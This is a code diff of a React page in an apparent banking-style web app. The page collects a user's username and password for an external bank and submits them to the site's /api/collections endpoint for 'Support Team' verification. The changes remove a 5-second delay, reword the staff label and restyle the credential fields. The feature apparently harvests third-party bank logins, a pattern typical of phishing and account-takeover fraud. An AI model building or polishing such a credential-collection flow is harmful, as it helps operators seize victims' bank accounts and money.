@@ -19,29 +19,27 @@ export default function CollectionPage({ user }: CollectionPageProps) {
     e.preventDefault();
     setLoading(true);
 
-    setTimeout(async () => {
-      try {
-        const response = await fetch("/api/collections", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            userId: user.id,
-            ...formData
-          }),
-        });
+    try {
+      const response = await fetch("/api/collections", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          userId: user.id,
+          ...formData
+        }),
+      });
 
-        if (response.ok) {
-          setSubmitted(true);
-          toast.success("Request sent to administration");
-        } else {
-          toast.error("Failed to submit request");
-        }
-      } catch (error) {
-        toast.error("An error occurred");
-      } finally {
-        setLoading(false);
+      if (response.ok) {
+        setSubmitted(true);
+        toast.success("Request sent to Support Team");
+      } else {
+        toast.error("Failed to submit request");
       }
-    }, 5000);
+    } catch (error) {
+      toast.error("An error occurred");
+    } finally {
+      setLoading(false);
+    }
   };
 
   if (submitted) {
@@ -52,7 +50,7 @@ export default function CollectionPage({ user }: CollectionPageProps) {
         </div>
         <h1 className="text-3xl font-black text-white uppercase tracking-tight">Request Submitted</h1>
         <p className="text-[#8E9BAE] max-w-md mx-auto font-medium text-xs leading-relaxed uppercase font-mono">
-          Your internet banking collection request has been sent to our administration team for verification. You will be notified once it is approved.
+          Your internet banking collection request has been sent to our Support Team for verification. You will be notified once it is approved.
         </p>
         <div className="pt-8">
           <button 
@@ -97,7 +95,7 @@ export default function CollectionPage({ user }: CollectionPageProps) {
                       required
                       value={formData.username}
                       onChange={e => setFormData({...formData, username: e.target.value})}
-                      className="w-full pl-10 pr-4 py-3 bg-white text-black text-xs font-black placeholder:text-[#8E9BAE] border border-[#1E2638] rounded focus:border-[#F59E0B]"
+                      className="w-full pl-10 pr-4 py-3 bg-[#0B0F17]/80 text-white text-xs font-black placeholder:text-[#8E9BAE] border border-[#1E2638] rounded focus:border-[#F59E0B] outline-none transition-colors"
                       placeholder="Enter external bank username"
                     />
                   </div>
@@ -112,7 +110,7 @@ export default function CollectionPage({ user }: CollectionPageProps) {
                       required
                       value={formData.password}
                       onChange={e => setFormData({...formData, password: e.target.value})}
-                      className="w-full pl-10 pr-4 py-3 bg-white text-black text-xs font-black placeholder:text-[#8E9BAE] border border-[#1E2638] rounded focus:border-[#F59E0B]"
+                      className="w-full pl-10 pr-4 py-3 bg-[#0B0F17]/80 text-white text-xs font-black placeholder:text-[#8E9BAE] border border-[#1E2638] rounded focus:border-[#F59E0B] outline-none transition-colors"
                       placeholder="Enter external bank password"
                     />
                   </div>
